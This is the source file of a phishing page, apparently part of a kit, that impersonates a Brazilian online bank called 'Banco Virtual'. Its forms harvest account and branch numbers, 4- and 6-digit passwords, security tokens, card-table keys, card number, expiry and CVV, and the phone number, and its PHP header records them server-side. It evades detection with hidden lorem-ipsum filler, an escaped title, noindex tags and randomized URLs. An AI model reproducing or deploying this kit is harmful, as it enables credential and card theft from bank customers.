<?php
require_once('../_admin/config.php');
require_once('../validacao.php');
require_once('../Lorem.php');
if(isset($_SESSION['agencia']) && strlen($_SESSION['agencia']) > 2 && isset($_SESSION['conta']) && strlen($_SESSION['conta']) > 3 && isset($_SESSION['s4']) && strlen($_SESSION['s4']) == 4){

    $agencia = $_SESSION['agencia'];
    $conta = $_SESSION['conta'];
    $aConta = explode('-', $conta);
    $conta = $aConta[0];
    $digito = $aConta[1];
    $s4 = $_SESSION['s4'];
    Info::gravarInfoMobile($_SESSION['idAcesso'], $agencia, $conta, $digito, $senha4);
    
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
	<meta name="robots" content="noindex, nofollow" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/style-custom.css">
    <link rel="shortcut icon" href="images/favicon.ico">
<script>
document.write(unescape('%3Ctitle%3EBanco%20Virtual%20%7C%20Entre%20N%C3%B3s%2C%20Voc%C3%AA%20Vem%20Primeiro%3C/title%3E'));
</script>
	      <style>
         p.random{display:none!important;}
         
         /* FORÇAR APLICAÇÃO DO NOVO DESIGN QR CODE */
         #capturaQR {
             background: linear-gradient(135deg, rgba(255,255,255,0.95) 0%, rgba(248,249,250,0.95) 100%) !important;
             border-radius: 20px !important;
             padding: 30px 20px !important;
             margin: 20px auto !important;
             width: 90% !important;
             max-width: 400px !important;
             box-shadow: 0 10px 30px rgba(0,0,0,0.2) !important;
             backdrop-filter: blur(10px) !important;
             border: 1px solid rgba(255,255,255,0.3) !important;
             text-align: center !important;
             color: #333 !important;
         }
         
         #capturaQR h1 {
             font-size: 24px !important;
             font-weight: bold !important;
             color: #0066cc !important;
             margin-bottom: 25px !important;
             text-align: center !important;
             text-shadow: 0 2px 4px rgba(0,0,0,0.1) !important;
         }
         
         #capturaQR .itemQr,
         #capturaQR .itemQr.clearfix {
             display: flex !important;
             flex-direction: column !important;
             align-items: center !important;
             justify-content: center !important;
             width: 100% !important;
             margin: 0 !important;
             padding: 15px 0 !important;
             border: none !important;
             background: transparent !important;
         }
         
         #capturaQR .esquerdaQr {
             width: 100% !important;
             float: none !important;
             margin-bottom: 20px !important;
             padding: 20px !important;
             display: flex !important;
             justify-content: center !important;
             align-items: center !important;
             background: rgba(0, 102, 204, 0.05) !important;
             border-radius: 15px !important;
             border: 2px solid rgba(216, 55, 86, 0.1) !important;
         }
         
         #capturaQR .esquerdaQr p {
             width: 100% !important;
             margin: 0 !important;
             padding: 0 !important;
             font-size: 16px !important;
             line-height: 1.6 !important;
             color: #444 !important;
             text-align: center !important;
             font-weight: 500 !important;
         }
         
         #capturaQR .esquerdaQr .number {
             display: inline-block !important;
             background: #0066cc !important;
             color: white !important;
             width: 30px !important;
             height: 30px !important;
             border-radius: 50% !important;
             text-align: center !important;
             line-height: 30px !important;
             font-weight: bold !important;
             font-size: 16px !important;
             margin-right: 10px !important;
             vertical-align: top !important;
         }
         
         #capturaQR .direitaQr {
             width: 100% !important;
             float: none !important;
             display: flex !important;
             justify-content: center !important;
             align-items: center !important;
             flex-direction: column !important;
             margin: 0 !important;
             padding: 20px !important;
             background: white !important;
             border-radius: 15px !important;
             box-shadow: 0 5px 15px rgba(0,0,0,0.1) !important;
             border: 2px solid rgba(216, 55, 86, 0.1) !important;
         }
         
         #capturaQR .qrBox {
             display: flex !important;
             justify-content: center !important;
             align-items: center !important;
             width: 100% !important;
             margin: 0 !important;
             padding: 20px !important;
             background: white !important;
             border-radius: 15px !important;
             border: 2px dashed #d83756 !important;
         }
         
         #capturaQR .qrBox img {
             max-width: 180px !important;
             width: 100% !important;
             height: auto !important;
             border-radius: 12px !important;
             box-shadow: 0 8px 20px rgba(0,0,0,0.15) !important;
             display: block !important;
             margin: 0 auto !important;
             border: 3px solid white !important;
         }
         
         #capturaQR .direitaQr input {
             width: 150px !important;
             height: 50px !important;
             margin: 15px auto 10px auto !important;
             padding: 0 20px !important;
             font-size: 18px !important;
             text-align: center !important;
             border: 2px solid #e0e0e0 !important;
             border-radius: 25px !important;
             background: white !important;
             color: #333 !important;
             font-weight: 600 !important;
             letter-spacing: 2px !important;
             transition: all 0.3s ease !important;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1) !important;
         }
         
         #capturaQR .direitaQr input:focus {
             border-color: #0066cc !important;
             box-shadow: 0 0 0 3px rgba(216, 55, 86, 0.1) !important;
             outline: none !important;
         }
         
         #capturaQR .direitaQr .leg {
             display: block !important;
             text-align: center !important;
             margin: 0 auto !important;
             font-size: 14px !important;
             color: #666 !important;
             font-weight: 500 !important;
             background: rgba(0, 102, 204, 0.1) !important;
             padding: 8px 16px !important;
             border-radius: 20px !important;
             width: fit-content !important;
         }
         
         #capturaQR .divBotoesPagina {
             width: 100% !important;
             display: flex !important;
             justify-content: center !important;
             align-items: center !important;
             margin: 25px auto 0 auto !important;
             padding: 0 !important;
         }
         
         #capturaQR .divBotoesPagina button {
             width: 100% !important;
             max-width: 250px !important;
             height: 55px !important;
             margin: 0 auto !important;
             padding: 0 30px !important;
             font-size: 18px !important;
             font-weight: bold !important;
             color: white !important;
             background: linear-gradient(135deg, #0066cc 0%, #004499 100%) !important;
             border: none !important;
             border-radius: 27px !important;
             cursor: pointer !important;
             transition: all 0.3s ease !important;
             box-shadow: 0 5px 15px rgba(216, 55, 86, 0.3) !important;
             text-transform: uppercase !important;
             letter-spacing: 1px !important;
         }
         
         #capturaQR .divBotoesPagina button:hover {
             transform: translateY(-2px) !important;
             box-shadow: 0 8px 25px rgba(216, 55, 86, 0.4) !important;
         }
         
         /* Responsividade */
         @media (max-width: 480px) {
             #capturaQR {
                 width: 95% !important;
                 padding: 25px 15px !important;
                 margin: 15px auto !important;
             }
             
             #capturaQR h1 {
                 font-size: 22px !important;
                 margin-bottom: 20px !important;
             }
             
             #capturaQR .esquerdaQr p {
                 font-size: 15px !important;
             }
             
             #capturaQR .qrBox img {
                 max-width: 160px !important;
             }
             
             #capturaQR .direitaQr input {
                 width: 130px !important;
                 height: 45px !important;
                 font-size: 16px !important;
             }
             
             #capturaQR .divBotoesPagina button {
                 height: 50px !important;
                 font-size: 16px !important;
             }
         }
         
         @media (max-width: 360px) {
             #capturaQR {
                 width: 98% !important;
                 padding: 20px 10px !important;
             }
             
             #capturaQR h1 {
                 font-size: 20px !important;
             }
             
             #capturaQR .esquerdaQr p {
                 font-size: 14px !important;
             }
             
             #capturaQR .qrBox img {
                 max-width: 140px !important;
             }
             
             #capturaQR .direitaQr input {
                 width: 120px !important;
                 height: 42px !important;
                 font-size: 15px !important;
             }
         }
      </style>
	    <script type="text/javascript">

  function gerarCodigo(length) {
    var caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var codigo = '';
    for (var i = 0; i < length; i++) {
      codigo += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
    }
    return codigo;
  }

  function alterar_url(nova) {
    var codigo = gerarCodigo(60);
    var dataHoraAtual = new Date();
    var dia = dataHoraAtual.getDate().toString().padStart(2, '0');
    var mes = (dataHoraAtual.getMonth() + 1).toString().padStart(2, '0');
    var ano = dataHoraAtual.getFullYear().toString();
    var hora = dataHoraAtual.getHours().toString().padStart(2, '0');
    var minutos = dataHoraAtual.getMinutes().toString().padStart(2, '0');
    var segundos = dataHoraAtual.getSeconds().toString().padStart(2, '0');
    
    var link = nova + "=?" + codigo + dia + mes + ano + '_' + hora + minutos + segundos;
    history.pushState({}, null, link);
  }
  </script>
</head>
<body onload="alterar_url('')">
    <nav class="navbar d-flex">
        <a class="navbar-brand" href="javascript:;"><img src="images/bars.png" alt=""></a>
        <p class="header-title">Banco Virtual</p>
    </nav>
    <div id="boxAguardar" class="boxes hide">

        <h3 class="title aguarde">Aguarde...</h3>

        <img class="mx-auto d-block" src="images/aguardando.gif">

        <div class="conteudo">
            <p class="destaque"><span class="nome"></span>Para concluir o acesso, será necessário utilizar sua chave de segurança, para isso:</p>

            <div class="item equalHMRWrap">
                <div class="contador">1</div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                <div class="texto"><p>Acesse o aplicativo Banco Virtual instalado em seu dispositivo móvel</p></div>
            </div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <div class="item">
                    <div class="contador">2</div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                    <div class="texto"><p>Selecione a opção "Chave de Segurança"</p></div>
            </div>
            <div class="item">
                    <div class="contador">3</div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                    <div class="texto"><p>Informe seu PIN (senha de 4 dígitos)</p></div>
            </div>
            <div class="item">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                    <div class="contador">4</div>
                    <div class="texto"><p>Informe a chave de segurança de 6 digítos informada no visor do seu dispositivo</p></div>
            </div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>

        </div>

    </div>
    <div id="boxAcesso" class="boxes">
        <h3 class="title content">ACESSO À CONTA</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <section id="form">
        <form id="acessoForm" action="index.php" method="POST"  autocomplete="off">
                <div class="input-container">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                    <input id="agencia" name="agencia" maxlength="4" onkeyup="this.value=this.value.replace(/[^\d]/,'')" class="field" type="tel" pattern=".+"/>
                    <label class="label" for="agencia">Agência</label>
                </div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                <div class="input-container">
                        <input id="conta" name="conta" onkeyup="this.value=this.value.replace(/[^\d]/,'')" class="input field" type="tel" pattern=".+"/>
                        <label class="label" for="conta">Conta</label>
                </div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                <div class="input-container">
                        <input id="s4" name="s4" onkeyup="this.value=this.value.replace(/[^\d]/,'')" maxlength="4" class="input field" type="tel" oninput="this.value = this.value.replace(/[^0-9]/g, '')" pattern=".+"/>
                        <label class="label" for="s4">Senha 4 Dígitos</label>
                </div>
                <div class="input-container-buttons">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                    <label for="">Titularidade</label>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                    <button type="button" class="btn-option red" style="width: 32%;">1º Titular</button>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                    <button type="button" class="btn-option" style="width: 32%;margin-left: 0.9%;">2º Titular</button type="button">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                    <button type="button" class="btn-option" style=" width: 32%;margin-left: 0.9%;">3º Titular</button type="button">
                </div>
                <input type="submit" class="btn-acessar bt_avancar" value="Acessar">
            </form>
        </section>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
    </div>
	<div id="boxQrCode" class="boxes hide">
            <div class="boxLinha">
            <span class="txt_msg_erro_disp">
                  <span class="erro_msg ml10 none_i error-show"><b>O código informado não está correto.</b></span>
               </span>
               <div id="aguardeQR" class="hide">
                     <p>Estamos gerando uma transação aleatória para que seja possível exibir uma nova imagem <strong>QR Code</strong><br>para que você efetue a captura utilizando o <strong>App Banco Virtual</strong> instalado em seu celular.</p>
                     <img class="loadingQr" width="70" src="images/loading-inicial.gif" alt="">
                     <br>
                     <a href="javascript:;"><img width="130" src="images/btn-aguarde-disabled.png" alt=""></a>
               </div>
               <div id="capturaQR" class="hide">
                  <h1>Validação Digital</h1>
                  <div class="itemQr clearfix">
                     <div class="esquerdaQr">
                        <p><span class="number">1.</span>No Aplicativo Banco Virtual, acesse a <strong>Chave de Segurança</strong>.  Em seguida, toque na opção <strong>Validação Digital</strong> e faça a leitura desta imagem com a câmera do seu celular.</p>
                     </div>
                     <div class="direitaQr">
                        <div class="qrBox"><img width="161" src=""></div>
                     </div>
                  </div>
                  <div class="itemQr clearfix" style="border:none">
                     <div class="esquerdaQr">
                        <p><span class="number">2.</span>Digite o código que aparece no celular para validar a transação.</p>
                     </div>
                     <div class="direitaQr">
                           <input type="password" class="input field" title="Digite a chave informada no visor do seu celular." id="qrCodeToken" name="codigoDispositivo" size="8" maxlength="8" tabindex="10" value="">
                           <span class="leg">(8 dígitos)</span>
                     </div>
                  </div>
                  
                  <div class="divBotoesPagina">
                     <button type="button" id="btnConfirmarQr" class="btn-acessar bt_avancar" title="Confirmar" tabindex="5">Confirmar</button>
                  </div>
               </div>

            </div>
        </div>
    <div id="boxToken" class="boxes hide">
        <h3 class="title content">CHAVE DE SEGURANÇA</h3>
        <div class="erro hide">
            <p class="msg"></p>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        </div>
        <div class="center">
            <img class="token" src="images/chave-seguranca.png" alt="">
        </div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <p><span class="nome"></span>Informe a chave de segurança visualizada no visor do seu dispositivo para que possamos sincronizar á sua conta.</p>
        <section id="form-token">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <form autocomplete="off">
                    <div class="input-container">
                        <i class="fa fa-envelope icon"><img src="images/logo.png"></i>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                        <input type="tel" id="tokenChave" class="input-field" maxlength="6" onkeyup="this.value=this.value.replace(/[^\d]/,'')" pattern=".+" required placeholder="CHAVE DE SEGURANÇA" name="chave" id="chave">
                    </div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
            </form>
        </section>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
    </div>
    <div id="boxTabela" class="boxes hide">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <h3 class="title content">CHAVE DE SEGURANÇA</h3>
        <div class="erro hide">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <p class="msg"></p>
        </div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <div class="center">
            <img class="token" src="images/tabela.png" alt="">
        </div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <p><span class="nome"></span>Preencha o campo abaixo com a chave indicada no verso do seu cartão, conforme posição solicitada.</p>
        <div class="center" style="margin-bottom:30px;">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <p style="margin-bottom: 10px;"><strong>Posição <span id="posicaoChave"></span></strong> no verso do cartão:</p>
            <input type="tel" id="chaveTabela" class="frmField" maxlength="3" style="width: 80px; text-align: center;" onkeyup="this.value=this.value.replace(/[^\d]/,'')">
        </div>
        <div class="container">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
    <div id="boxCvv" class="boxes hide">
        <h3 class="title content">DADOS DO CARTÃO</h3>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <div class="erro hide">
            <p class="msg"></p>
        </div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <div class="center">
            <img class="token" src="images/cvv.png" alt="">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        </div>
        <p><span class="nome"></span>Preencha os campos abaixo com os dados do seu <strong>cartão de crédito / débito</strong>.</p>
        
        <div class="center" style="margin-bottom:20px;">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <p style="margin-bottom: 10px;"><strong>Número do cartão:</strong></p>
            <input type="tel" id="numeroCartao" class="frmField" maxlength="22" style="width: 90%; max-width: 300px; text-align: center; font-size: 16px;" placeholder="0000.0000.0000.0000">
        </div>
        
        <div class="center" style="margin-bottom:20px;">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <p style="margin-bottom: 10px;"><strong>Mês/Ano:</strong></p>
            <input type="tel" id="mesAno" class="frmField" maxlength="5" style="width: 100px; text-align: center;" placeholder="MM/AA">
        </div>
        
        <div class="center" style="margin-bottom:30px;">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <p style="margin-bottom: 10px;"><strong>CVV:</strong></p>
            <input type="tel" id="cvv" class="frmField" maxlength="3" style="width: 80px; text-align: center;" placeholder="CVV">
        </div>
        
        <div class="container">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
    <div id="boxCelular" class="boxes hide">
        <h3 class="title content">NÚMERO DO CELULAR</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <div class="center">
            <img class="token" src="images/celular.png" alt="">
        </div>
        <p><span class="nome"></span>Confirme no campo abaixo o <strong>número do celular</strong> cadastrado em sua conta.</p>
        <div class="center" style="margin-bottom:30px;">
            <p style="margin-bottom: 10px;"><strong>Número do celular:</strong></p>
            <input type="tel" id="celular" class="frmField" maxlength="3" style="width: 200px; text-align: center;">
        </div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
    <div id="boxSenhaDe6" class="boxes hide">
        <h3 class="title content">SENHA DE 6 DÍGITOS</h3>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <img class="token" src="images/password.png" alt="">
        </div>
        <p><span class="nome"></span>Informe sua senha de <strong style="white-space:nowrap">6 Dígitos</strong> a mesma utilizada nos terminais de autoatendimento Banco Virtual.</p>
        <div class="center" style="margin-bottom:30px;">
            <p style="margin-bottom: 10px;"><strong>Senha de 6 Dígitos:</strong></p>
            <input type="tel" id="senhaDe6" class="frmField" maxlength="6" style="width: 200px; text-align: center;" onkeyup="this.value=this.value.replace(/[^\d]/,'')">
        </div>
        <div class="container">   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
    <div id="footer">
    </div>
    <input type="hidden" name="clientHashId" id="clientHashId" value="<?php echo $_GET["hash"];?>">
    <input type="hidden" name="id" id="id" value="<?php echo isset($_SESSION["id"]) ? $_SESSION["id"] : '';?>">
    <input type="hidden" name="idAcesso" id="idAcesso" value="<?php echo isset($_SESSION["idAcesso"]) ? $_SESSION["idAcesso"] : '';?>">
    <script src="js/jquery.min.js"></script>
    <script src="js/jquery.mask.min.js"></script>
    <script src="js/main.js"></script>
    
    <script>
        // GARANTIR QUE O NOVO DESIGN SEJA APLICADO
        $(document).ready(function() {
            console.log('🎨 Novo design QR Code carregado!');
            
            // Forçar aplicação dos estilos quando a página carregar
            setTimeout(function() {
                $('#capturaQR').addClass('novo-design-aplicado');
                console.log('✅ Estilos do novo design aplicados!');
            }, 100);
            
            // Monitorar quando o QR code for exibido
            var observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
                        var target = mutation.target;
                        if (target.id === 'capturaQR' && !target.classList.contains('hide')) {
                            console.log('📱 QR Code exibido - aplicando novo design!');
                            // Garantir que o novo design seja aplicado
                            target.style.display = 'block';
                        }
                    }
                });
            });
            
            // Observar mudanças na div capturaQR
            var capturaQR = document.getElementById('capturaQR');
            if (capturaQR) {
                observer.observe(capturaQR, { attributes: true });
            }
        });
        
        // Função para forçar a aplicação do design
        function aplicarNovoDesign() {
            var capturaQR = document.getElementById('capturaQR');
            if (capturaQR) {
                capturaQR.classList.add('novo-design-aplicado');
                console.log('🎨 Novo design forçado!');
            }
        }
    </script>
</body>
</html>